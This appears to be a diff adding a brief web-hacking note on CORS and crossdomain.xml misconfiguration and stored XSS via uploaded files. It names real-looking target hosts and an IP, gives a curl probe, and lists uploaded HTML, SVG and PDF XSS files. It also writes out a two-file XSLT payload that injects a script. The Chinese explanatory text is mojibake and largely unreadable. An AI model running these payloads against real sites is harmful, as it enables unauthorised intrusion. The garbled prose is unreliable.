@@ -1,0 +1,29 @@
+crossdomain.xmlÊÇadobe¸ãµÄ£¬ÎªÁËÈÃflash¿çÓò·ÃÎÊÎÄ¼þ(¿çÓò×ÊÔ´ÇëÇóÎÄ¼þ)
+http://220.172.165.183:8083/crossdomain.xml
+Êý¾Ý°üÍ·²¿£ºOrigin:https://baidu.com
+ÏìÓ¦°ü£ºAccess-Control-Allow-0rigin:
+CURL²é¿´£ºcurl ÓòÃû -H "Origin: https://baidu.com" -I
+ÉÏ´«xmlÎÄ¼þ±ØÐëCORSÔÊÐíËùÓÐÓò CORS ¿çÓò×ÊÔ´ÇëÇó(ÔÊÐíÎÒÃÇÍøÕ¾¼ÓÔØÆäËûÍøÒ³´úÂë)
+https://res2m.age06.com/
+
+html-XSS https://res2m.age06.com/File/1/shangxin.html
+svg-XSS https://res2m.age06.com/File/1/shangxin.svg
+pdf-XSS https://res2m.age06.com/File/1/shangxin.pdf
+xml
+
+xmlËüÐèÒªÉÏ´«2¸öÎÄ¼þ Ê×ÏÈÉÏ´«µÚÒ»¸öxmlÎÄ¼þ(urlµØÖ·ÎÒÃÇÊ×ÏÈÄÃµ½) ÔÚÉÏ´«µÚ¶þ¸öxmlÎÄ¼þ
+
+xml1£ºhttps://res2m.age06.com/File/1/shangxin1.xml
+<?xml version="1.0" encoding="iso-8859-1"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+<html><body>
+<script>alert(/618/);</script>
+</body></html>
+</xsl:template>
+</xsl:stylesheet>
+
+xml2:
+<?xml version="1.0" encoding="iso-8859-1"?>
+<?xml-stylesheet type="text/xsl" href="https://res2m.age06.com/File/1/shangxin1.xml"?>
+<test></test>
